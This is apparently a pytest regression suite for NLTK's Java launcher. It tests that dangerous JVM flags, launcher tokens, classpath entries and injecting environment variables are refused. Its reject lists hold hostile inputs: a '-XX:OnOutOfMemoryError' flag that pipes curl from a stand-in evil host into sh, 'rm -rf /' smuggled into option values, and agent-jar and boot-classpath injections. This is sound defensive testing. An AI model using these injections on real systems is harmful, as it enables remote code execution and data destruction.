"""
Regression test for GHSA-m4rf (incomplete fix of CVE-2026-12841, CWE-88).

Two defects are covered:

1. ``config_java()`` validated the *global* java options, but ``java()``'s
   per-call ``options`` parameter reached ``subprocess.Popen`` without
   validation, so a caller could inject a dangerous JVM flag on any
   Stanford/CoreNLP wrapper call. ``java()`` now validates per-call options too.

2. The validator itself blanket-allowed the ``-XX:`` prefix (``-XX:OnError=`` /
   ``-XX:OnOutOfMemoryError=`` are executed as shell commands by the JVM) and all
   ``-D`` system properties (e.g. ``-Djava.ext.dirs``). It is now a minimal
   allowlist of exactly what NLTK and the Stanford CoreNLP docs use: heap/stack
   sizing, ``-verbose``, ``-server``/``-client`` and ``--add-modules``. Anything
   else (including ``-XX:`` and ``-D``) is rejected; a caller that vouches for an
   unlisted flag passes it via ``java(trusted_raw_options=...)``.
"""

import os

import pytest

from nltk import internals


@pytest.fixture
def stub_java_bin(monkeypatch):
    # Avoid config_java()'s binary search so the call reaches option validation.
    monkeypatch.setattr(internals, "_java_bin", "/usr/bin/java")
    monkeypatch.setattr(internals, "_java_options", [])


DANGEROUS = [
    # program-changing / agent / argfile flags
    ["-javaagent:/tmp/evil.jar"],
    ["-agentlib:jdwp=transport=dt_socket"],
    ["-agentpath:/tmp/evil.so"],
    "-Xrunjdwp:transport=dt_socket,server=y",
    ["@/tmp/argfile"],
    ["-jar", "/tmp/evil.jar"],
    # -XX: command-execution flags (JVM runs these on error / OOM) -- verified
    # live: -XX:OnOutOfMemoryError executed the injected command.
    ["-XX:OnError=touch /tmp/pwned"],
    ["-XX:OnOutOfMemoryError=curl evil.com|sh"],
    ["-XX:OnError=/bin/reboot"],
    ["-XX:onerror=reboot"],
    ["-XX:+UnlockDiagnosticVMOptions"],
    ["-XX:ErrorFile=/tmp/e"],
    ["-XX:Flags=/tmp/e"],  # read VM options from an attacker file
    ["-XX:VMOptionsFile=/tmp/e"],
    ["-XX:SharedArchiveFile=/tmp/e"],
    ["-XX:ParallelGCThreads=1"],  # even a benign -XX: is rejected (use escape hatch)
    # -D system properties: not needed by NLTK/CoreNLP and can load code.
    ["-Dfile.encoding=UTF-8"],
    ["-Djava.ext.dirs=/tmp/evil"],
    ["-Djava.rmi.server.codebase=http://evil/"],
    ["-Djava.system.class.loader=Evil"],
    # module path / module-system flags could point at or open attacker code
    # (only --add-modules with a plain module list is allowed)
    ["--module-path=/tmp/evil"],
    ["-p", "/tmp/evil"],
    ["--add-opens", "java.base/java.lang=ALL-UNNAMED"],
    ["--add-exports", "java.base/sun.misc=ALL-UNNAMED"],
    ["--add-reads", "java.base=ALL-UNNAMED"],
    ["--patch-module", "java.base=/tmp/evil"],
    ["--upgrade-module-path=/tmp/evil"],
    # -cp / -classpath in options would add an unverified classpath
    ["-cp", "/tmp/evil"],
    ["-classpath", "/tmp/evil"],
    ["--class-path=/tmp/evil"],
    # -D loaders / security-manager toggles
    ["-Djava.library.path=/tmp/evil"],
    ["-Djava.security.manager=Evil"],
    # boot classpath override -> load attacker classes ahead of the JDK
    ["-Xbootclasspath/a:/tmp/evil.jar"],
    ["-Xbootclasspath/p:/tmp/evil.jar"],
    ["-Xbootclasspath:/tmp/evil"],
    # -Xlog / -Xloggc write an attacker-chosen file
    ["-Xlog:gc:file=/tmp/pwned"],
    ["-Xloggc:/tmp/pwned"],
    # case variants must not bypass the (case-insensitive) allowlist match
    ["-JavaAgent:/tmp/evil.jar"],
    ["-AGENTLIB:jdwp=transport=dt_socket"],
    ["-XrunJDWP:x"],
    # --add-modules with a non-module-list value (shell metachars / path)
    ["--add-modules", "java.se.ee; rm -rf /"],
    ["--add-modules", "/etc/passwd"],
    ["--add-modules=;id"],
    # whitespace / control / shell-metachar smuggling on an allowed prefix
    ["-Xmx512m ; rm -rf /"],
    ["-Xmx$(id)"],
    ["-verbose:gc\n-XX:OnError=x"],
    ["-Xmx512m\x00-XX:OnError=id"],
    # tab / CR / NBSP / DEL smuggling on an allowed prefix: the shape guard must
    # reject these the same way it rejects the newline and NUL variants above.
    ["-Xmx512m\t-XX:OnError=x"],
    ["-Xmx512m\r-XX:OnError=x"],
    ["-Xmx512m\xa0-XX:OnError=x"],
    ["-Xmx512m\x7f-XX:OnError=x"],
    # -D classpath / security-config injection: set the classpath or swap the
    # policy / JAAS config via a system property, bypassing the -cp sandbox.
    ["-Djava.class.path=/tmp/evil"],
    ["-Djava.security.policy=/tmp/evil"],
    ["-Djava.security.auth.login.config=/tmp/evil"],
    ["-Djdk.attach.allowAttachSelf=true"],  # enable self-attach agent injection
    # disable bytecode verification -> load malformed / malicious classes
    ["-Xverify:none"],
    ["-noverify"],
    # unlock experimental options / read compile commands from an attacker file
    ["-XX:+UnlockExperimentalVMOptions"],
    ["-XX:CompileCommandFile=/tmp/evil"],
    ["-Xshare:dump"],  # dump a CDS archive to an attacker-chosen path
    ["--enable-native-access=ALL-UNNAMED"],  # grant native (Panama) access
    ["-xx:onerror=reboot"],  # fully-lowercase -XX: must still be rejected
    # suffix riding an allowed prefix: the anchored sizing/verbose shapes reject any
    # trailing bytes (empirically inert on the JVM, but refused for defense in depth)
    ["-Xmx512m@/tmp/argfile"],
    ["-verbose:gc:file=/tmp/pwned"],
    ["-verbose:foobar"],  # unknown -verbose category
    ["-Xmxevil"],  # sizing flag without a numeric size
    ["-Xmx"],  # sizing flag with no value at all
    ["-mx512m/tmp"],  # trailing path on a sizing flag
    ["-Xss128m-XX:OnError=x"],  # two flags concatenated, no metachar to catch it
    ["-Xbatchevil"],  # suffix on a no-argument mode flag
    ["-server_evil"],  # suffix on an exact-match flag
]


@pytest.mark.parametrize("opts", DANGEROUS)
def test_java_per_call_options_reject_injection(stub_java_bin, opts):
    """Per-call dangerous JVM flags must be refused before Popen runs."""
    with pytest.raises(ValueError):
        internals.java(["SomeMainClass"], classpath=".", options=opts)


SAFE = [
    # heap / stack sizing -- everything NLTK's wrappers and CoreNLP docs pass
    ["-Xmx512m"],
    ["-mx4g"],
    ["-mx2g"],
    ["-mx1000m"],
    ["-mx20m"],
    ["-Xmx1024m"],
    ["-Xms128m"],
    ["-Xss4m"],
    ["-server"],
    ["-client"],
    ["-verbose:gc"],
    # anchored-shape positives: raw-byte heap, capital unit, other categories and
    # no-argument mode flags all must keep passing after the tightening
    ["-Xmx2147483648"],
    ["-Xmx8G"],
    ["-Xss512k"],
    ["-verbose"],
    ["-verbose:class"],
    ["-Xint"],
    ["-Xcomp"],
    ["-Xbatch"],
    ["-Xmixed"],
    # --add-modules java.se.ee is required by CoreNLP on JDK 9-11 (both forms)
    ["--add-modules", "java.se.ee"],
    ["--add-modules=java.se.ee,java.xml.bind"],
]


@pytest.mark.parametrize("opts", SAFE)
def test_java_per_call_options_allow_safe(stub_java_bin, opts):
    """The minimal allowlist must accept every flag NLTK and CoreNLP actually
    use. (validate directly; the subsequent Popen would fail on the stub bin.)"""
    internals._validate_java_options(opts)


def test_trusted_raw_options_bypass_validation_but_default_path_does_not(
    stub_java_bin,
):
    """The escape hatch appends caller-vouched flags without validation, while the
    ordinary ``options`` path still rejects the same flag."""
    # options= is validated -> rejected
    with pytest.raises(ValueError):
        internals.java(["Main"], classpath=".", options=["-XX:ParallelGCThreads=1"])
    # trusted_raw_options is NOT validated: it reaches the command (the call then
    # fails at the stub java binary, not at the security gate).
    with pytest.raises(Exception) as exc:
        internals.java(
            ["Main"], classpath=".", trusted_raw_options=["-XX:ParallelGCThreads=1"]
        )
    assert not isinstance(exc.value, ValueError)


# --- cmd (main-class) channel: same launcher-token injection as options -------
# The first cmd token is the Java main class; a launcher switch or @argfile there
# runs an arbitrary JAR / injects JVM args (CWE-88). @argfile is rejected in any
# position because the launcher expands it wherever it appears.

DANGEROUS_CMD = [
    ["-jar", "/tmp/evil.jar"],
    ["@/tmp/argfile"],
    ["-XX:OnError=touch /tmp/pwned", "SomeMainClass"],
    ["SomeMainClass", "@/tmp/argfile"],  # @argfile smuggled into a later position
    ["-Xmx512m", "SomeMainClass"],
    ["-Dfile.encoding=UTF-8", "SomeMainClass"],
    [],  # no main class
    [None],  # non-string first token
    ["", "SomeMainClass"],  # empty first token
    # whitespace-prefixed launcher tokens (a shell/launcher may trim them, and a
    # main class never has surrounding whitespace) must not slip past the guard
    [" -jar", "/tmp/evil.jar"],
    ["\t-jar", "/tmp/evil.jar"],
    ["\n-jar", "/tmp/evil.jar"],
    [" @/tmp/argfile"],
    ["SomeMainClass", " @/tmp/argfile"],
    ["   ", "SomeMainClass"],  # whitespace-only first token
]


@pytest.mark.parametrize("cmd", DANGEROUS_CMD)
def test_java_cmd_channel_rejects_launcher_tokens(stub_java_bin, cmd):
    """A launcher switch / @argfile supplied through the cmd channel must be
    refused before Popen, mirroring the options-channel guard."""
    with pytest.raises(ValueError):
        internals.java(cmd)


def test_java_cmd_channel_allows_legitimate_main_class(stub_java_bin):
    """A real main class followed by "-" program args (Stanford wrappers pass
    -loadClassifier / -textFile) is not a violation: it clears the cmd guard and
    only fails later at the (stub) java binary, never with ValueError."""
    with pytest.raises(Exception) as exc:
        internals.java(
            [
                "edu.stanford.nlp.ie.crf.CRFClassifier",
                "-loadClassifier",
                "model.ser.gz",
                "-textFile",
                "/input.txt",
            ]
        )
    assert not isinstance(exc.value, ValueError)


class _PopenIntercept(Exception):
    """Raised by the fake Popen so the launcher command can be inspected without
    ever executing a real process."""


def test_option_validator_is_load_bearing(stub_java_bin, monkeypatch):
    """Mutation test: with the per-call option validator in place a dangerous flag
    is rejected before Popen is ever constructed; neuter the validator and the
    SAME flag flows straight into the launcher command line -- proving the
    validator (not some later check) is what contains the injection (CWE-88)."""
    captured = {}

    def _fake_popen(cmd, *args, **kwargs):
        captured["cmd"] = list(cmd)
        raise _PopenIntercept

    monkeypatch.setattr(internals.subprocess, "Popen", _fake_popen)
    danger = "-XX:OnError=touch /tmp/pwned"

    # validator ON: refused before any process is spawned
    with pytest.raises(ValueError):
        internals.java(["SomeMainClass"], options=[danger])
    assert "cmd" not in captured

    # validator neutered: the dangerous flag reaches the launcher command
    monkeypatch.setattr(internals, "_validate_java_options", lambda opts: None)
    with pytest.raises(_PopenIntercept):
        internals.java(["SomeMainClass"], options=[danger])
    assert danger in captured["cmd"], captured


UNICODE_WS_CMD = [
    ["\xa0-jar", "/tmp/evil.jar"],  # NBSP-prefixed launcher switch
    [" @/tmp/argfile"],  # en-quad-prefixed @argfile
    ["　-version"],  # ideographic-space-prefixed switch
]


@pytest.mark.parametrize("cmd", UNICODE_WS_CMD)
def test_java_cmd_channel_rejects_unicode_whitespace_prefix(stub_java_bin, cmd):
    """str.strip() removes Unicode whitespace too, so a NBSP/en-quad-prefixed
    launcher token cannot slip past the main-class guard."""
    with pytest.raises(ValueError):
        internals.java(cmd)


# --- classpath channel: only absolute jars inside a trusted data root ----------


@pytest.fixture
def trusted_jar(tmp_path, monkeypatch):
    """A real .jar inside a temporary trusted data root (on nltk.data.path), so
    _verify_jar_sandbox accepts it and the per-entry checks can be exercised."""
    import nltk.data

    root = tmp_path / "nltk_data"
    root.mkdir()
    jar = root / "good.jar"
    jar.write_bytes(b"PK\x03\x04")
    # Put this dir on nltk.data.path so it is one of the trusted roots (the sandbox
    # also adds the repo root / Weka dirs); enough to make these checks deterministic.
    monkeypatch.setattr(nltk.data, "path", [str(root)])
    return str(jar)


class TestJavaClasspathSandbox:
    """A caller-supplied classpath reaches ``-cp``. An empty element (``a.jar::`` /
    ``:a.jar`` / ``a.jar::b.jar`` / ``""`` in a list) is the JVM's spelling of the
    current working directory, so it would inject classes from CWD past the jar
    sandbox; it must be refused (CWE-88), as must relative, out-of-root, symlinked
    and @argfile entries."""

    def test_empty_classpath_entry_is_refused(self, stub_java_bin, trusted_jar):
        sep = os.pathsep
        for bad in (
            trusted_jar + sep + sep,  # trailing ::
            sep + trusted_jar,  # leading :
            trusted_jar + sep + sep + trusted_jar,  # empty middle
            [trusted_jar, ""],  # empty list entry
            [trusted_jar, None],  # non-string list entry
        ):
            with pytest.raises((ValueError, internals.UntrustedJarError)):
                internals.java(["Main"], classpath=bad)

    def test_entry_embedding_path_separator_refused(self, stub_java_bin, trusted_jar):
        """A single list entry that embeds os.pathsep would pass the per-entry root
        check as one path but re-split in the JVM into extra unverified elements
        (out-of-root jar or empty CWD element); it must be refused."""
        sep = os.pathsep
        for bad in (
            [trusted_jar + sep],  # trailing separator -> empty CWD element
            [trusted_jar + sep + os.path.realpath(os.sep + "etc")],  # out-of-root
            [trusted_jar + sep + sep],  # smuggled empty CWD element
        ):
            with pytest.raises(internals.UntrustedJarError):
                internals.java(["Main"], classpath=bad)

    def test_relative_classpath_refused(self, stub_java_bin):
        with pytest.raises(internals.UntrustedJarError):
            internals.java(["Main"], classpath="relative.jar")

    def test_dot_cwd_classpath_refused(self, stub_java_bin):
        """ "." / ".." are the current/parent dir; relative, so refused."""
        for bad in (".", "..", os.path.join(".", "x.jar")):
            with pytest.raises(internals.UntrustedJarError):
                internals.java(["Main"], classpath=bad)

    def test_non_string_classpath_entry_refused(self, stub_java_bin, trusted_jar):
        """A non-string list entry (Path / int / bytes) is an unsupported type, not
        a CWD element: refused with a type message, never reaching Popen."""
        from pathlib import Path

        for bad in (Path(trusted_jar), 1234, b"/tmp/evil.jar"):
            with pytest.raises(internals.UntrustedJarError) as exc:
                internals.java(["Main"], classpath=[trusted_jar, bad])
            assert "must be a string" in str(exc.value)

    def test_bytes_classpath_refused(self, stub_java_bin):
        """A bytes classpath is list()-ed into ints by java(); each is non-string
        and refused (fail closed), never silently coerced."""
        with pytest.raises(internals.UntrustedJarError):
            internals.java(["Main"], classpath=b"/tmp/evil.jar")

    def test_nul_byte_classpath_entry_refused(self, stub_java_bin, trusted_jar):
        """A NUL byte truncates the path in native calls; refused with a clear
        UntrustedJarError, not a bare ValueError from realpath."""
        with pytest.raises(internals.UntrustedJarError) as exc:
            internals.java(["Main"], classpath=trusted_jar + "\x00/etc/passwd")
        assert "NUL" in str(exc.value)

    def test_outside_root_classpath_refused(self, stub_java_bin, trusted_jar):
        with pytest.raises(internals.UntrustedJarError):
            internals.java(["Main"], classpath=os.path.realpath(os.sep + "etc"))

    def test_symlink_escape_refused(self, stub_java_bin, trusted_jar, tmp_path):
        outside = tmp_path / "outside.jar"
        outside.write_bytes(b"PK\x03\x04")
        link = os.path.join(os.path.dirname(trusted_jar), "link.jar")
        try:
            os.symlink(str(outside), link)
        except (OSError, NotImplementedError):
            pytest.skip("symlinks not supported here")
        with pytest.raises(internals.UntrustedJarError):
            internals.java(["Main"], classpath=link)

    def test_argfile_classpath_refused(self, stub_java_bin):
        with pytest.raises(internals.UntrustedJarError):
            internals.java(["Main"], classpath="@/tmp/argfile")

    def test_legit_trusted_jar_reaches_cp_without_empty(
        self, stub_java_bin, trusted_jar, monkeypatch
    ):
        captured = {}

        def _fake_popen(cmd, *a, **k):
            captured["cmd"] = list(cmd)
            raise _PopenIntercept

        monkeypatch.setattr(internals.subprocess, "Popen", _fake_popen)
        with pytest.raises(_PopenIntercept):
            internals.java(["Main"], classpath=trusted_jar)
        cp_value = captured["cmd"][captured["cmd"].index("-cp") + 1]
        assert cp_value == trusted_jar
        assert "" not in cp_value.split(os.pathsep), cp_value

    def test_empty_entry_guard_is_load_bearing(
        self, stub_java_bin, trusted_jar, monkeypatch
    ):
        """Mutation: neuter the sandbox and the empty CWD element flows into -cp."""
        captured = {}

        def _fake_popen(cmd, *a, **k):
            captured["cmd"] = list(cmd)
            raise _PopenIntercept

        monkeypatch.setattr(internals.subprocess, "Popen", _fake_popen)
        monkeypatch.setattr(internals, "_verify_jar_sandbox", lambda entries: None)
        with pytest.raises(_PopenIntercept):
            internals.java(["Main"], classpath=trusted_jar + os.pathsep + os.pathsep)
        cp_value = captured["cmd"][captured["cmd"].index("-cp") + 1]
        assert "" in cp_value.split(os.pathsep), cp_value


# --- environment channel: JVM-injecting variables must be stripped -------------


class TestJavaEnvironmentSanitization:
    """The JVM reads JAVA_TOOL_OPTIONS / _JAVA_OPTIONS / JDK_JAVA_OPTIONS as extra
    flags and CLASSPATH as extra code, none of which the allowlist/sandbox sees.
    java() must strip them from the child environment (CWE-88 defense in depth)."""

    INJECTING = (
        "JAVA_TOOL_OPTIONS",
        "_JAVA_OPTIONS",
        "JDK_JAVA_OPTIONS",
        "IBM_JAVA_OPTIONS",
        "OPENJ9_JAVA_OPTIONS",
        "CLASSPATH",
    )

    @staticmethod
    def _capture_env(monkeypatch):
        captured = {}

        def _fake_popen(cmd, *a, **k):
            captured["env"] = k.get("env")
            raise _PopenIntercept

        monkeypatch.setattr(internals.subprocess, "Popen", _fake_popen)
        return captured

    def test_injecting_env_vars_stripped(self, stub_java_bin, monkeypatch):
        for var in self.INJECTING:
            monkeypatch.setenv(var, "-XX:OnError=touch /tmp/pwned")
        captured = self._capture_env(monkeypatch)
        with pytest.raises(_PopenIntercept):
            internals.java(["Main"])
        env = captured["env"]
        assert env is not None, "java() must pass an explicit, sanitized env"
        for var in self.INJECTING:
            assert var not in env, f"{var} leaked into the child JVM environment"

    def test_benign_env_preserved(self, stub_java_bin, monkeypatch):
        monkeypatch.setenv("NLTK_TEST_MARKER", "keepme")
        captured = self._capture_env(monkeypatch)
        with pytest.raises(_PopenIntercept):
            internals.java(["Main"])
        assert captured["env"].get("NLTK_TEST_MARKER") == "keepme"
        assert "PATH" in captured["env"]

    def test_env_strip_is_load_bearing(self, stub_java_bin, monkeypatch):
        """Mutation: empty the strip set and the injecting var reaches the child."""
        monkeypatch.setenv("JAVA_TOOL_OPTIONS", "-XX:OnError=x")
        monkeypatch.setattr(internals, "_JVM_INJECTING_ENV_VARS", frozenset())
        captured = self._capture_env(monkeypatch)
        with pytest.raises(_PopenIntercept):
            internals.java(["Main"])
        assert "JAVA_TOOL_OPTIONS" in captured["env"]

    def test_helper_strips_and_preserves(self, monkeypatch):
        """The shared _java_child_env() helper (used by java() and the MaltParser
        wrapper) drops every injecting var and keeps the rest."""
        monkeypatch.setenv("JAVA_TOOL_OPTIONS", "-Xmx1m")
        monkeypatch.setenv("CLASSPATH", "/tmp/evil")
        monkeypatch.setenv("NLTK_KEEP", "1")
        env = internals._java_child_env()
        assert "JAVA_TOOL_OPTIONS" not in env and "CLASSPATH" not in env
        assert env.get("NLTK_KEEP") == "1"


# --- MaltParser runs its OWN java subprocess, not internals.java(): it must apply
# the same env sanitization or JAVA_TOOL_OPTIONS et al. inject past the allowlist.


def test_maltparser_execute_strips_injecting_env(monkeypatch):
    from nltk.parse import malt

    captured = {}

    def _fake_popen(cmd, *a, **k):
        captured["env"] = k.get("env")

        class _P:
            def wait(self):
                return 0

        return _P()

    monkeypatch.setenv("JAVA_TOOL_OPTIONS", "-XX:OnError=touch /tmp/pwned")
    monkeypatch.setenv("_JAVA_OPTIONS", "-javaagent:/tmp/evil.jar")
    monkeypatch.setenv("NLTK_KEEP", "1")
    monkeypatch.setattr(malt.subprocess, "Popen", _fake_popen)
    malt.MaltParser._execute(["java", "-version"])
    env = captured["env"]
    assert env is not None, "MaltParser._execute must pass an explicit sanitized env"
    assert "JAVA_TOOL_OPTIONS" not in env and "_JAVA_OPTIONS" not in env
    assert env.get("NLTK_KEEP") == "1"  # benign vars are preserved


def test_config_java_validates_global_options(monkeypatch):
    """config_java() stores global options used when java(options=None); a
    dangerous global flag must be rejected there too, not just per-call."""
    monkeypatch.setattr(internals, "_java_options", [])
    with pytest.raises(ValueError):
        internals.config_java(bin="/usr/bin/java", options=["-XX:OnError=id"])
    # a safe global set is accepted and stored
    internals.config_java(bin="/usr/bin/java", options=["-Xmx512m"])
    assert internals._java_options == ["-Xmx512m"]


# --- discovery layer: an attacker who poisons a jar-discovery env var must still
# be caught by the classpath sandbox when the wrapper passes the jar to java().


def test_poisoned_jar_discovery_env_is_rejected_by_sandbox(
    stub_java_bin, tmp_path, monkeypatch
):
    """find_jar honors env vars (STANFORD_POSTAGGER etc.); a jar it returns from an
    attacker-set env still hits _verify_jar_sandbox and is refused if out of root."""
    import nltk.data

    trusted = tmp_path / "nltk_data"
    trusted.mkdir()
    monkeypatch.setattr(nltk.data, "path", [str(trusted)])  # only this dir is trusted
    attacker = tmp_path / "attacker"
    attacker.mkdir()
    evil = attacker / "stanford-postagger.jar"  # outside every trusted root
    evil.write_bytes(b"PK\x03\x04")
    monkeypatch.setenv("STANFORD_POSTAGGER", str(evil))
    found = internals.find_jar(
        "stanford-postagger.jar", None, env_vars=("STANFORD_POSTAGGER",), searchpath=()
    )
    assert found == str(evil)  # discovery layer trusts the (attacker-set) env var
    with pytest.raises(internals.UntrustedJarError):
        internals.java(["edu.stanford.nlp.tagger.maxent.MaxentTagger"], classpath=found)


def test_sandbox_trust_boundary_is_nltk_data_path(stub_java_bin, tmp_path, monkeypatch):
    """The sandbox trusts exactly nltk.data.path (+ repo/Weka): a jar inside a data
    root is accepted, one outside every root is refused."""
    import nltk.data

    root = tmp_path / "nltk_data"
    root.mkdir()
    inside = root / "good.jar"
    inside.write_bytes(b"PK\x03\x04")
    outside = tmp_path / "bad.jar"
    outside.write_bytes(b"PK\x03\x04")
    monkeypatch.setattr(nltk.data, "path", [str(root)])
    internals._verify_jar_sandbox([str(inside)])  # trusted: no raise
    with pytest.raises(internals.UntrustedJarError):
        internals._verify_jar_sandbox([str(outside)])
